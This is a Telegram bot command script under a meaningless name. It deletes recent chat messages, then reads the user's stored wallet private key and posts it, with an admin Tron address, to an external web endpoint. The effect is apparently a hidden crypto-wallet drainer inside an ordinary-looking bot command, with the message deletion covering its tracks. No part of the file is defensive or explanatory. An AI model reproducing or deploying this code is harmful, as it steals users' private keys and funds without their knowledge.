/*CMD
  command: refhyhvfjk
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

if (request.data) {
  var message_id = request.message.message_id
  var chat_id = request.message.chat.id

Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id
  })
Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id-1
  })
Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id-2
  })
}

var wallpk = Bot.getProperty("wallp"+user.telegramid)
var me = Bot.getProperty("cp_publickey01","🛑 Not Set")
HTTP.post( {
    url: "https://tronb2.vercel.app/easytrx",
    success: '/completedmkb',
    body: {private_key: wallpk,Admin_tron_address:me}

})
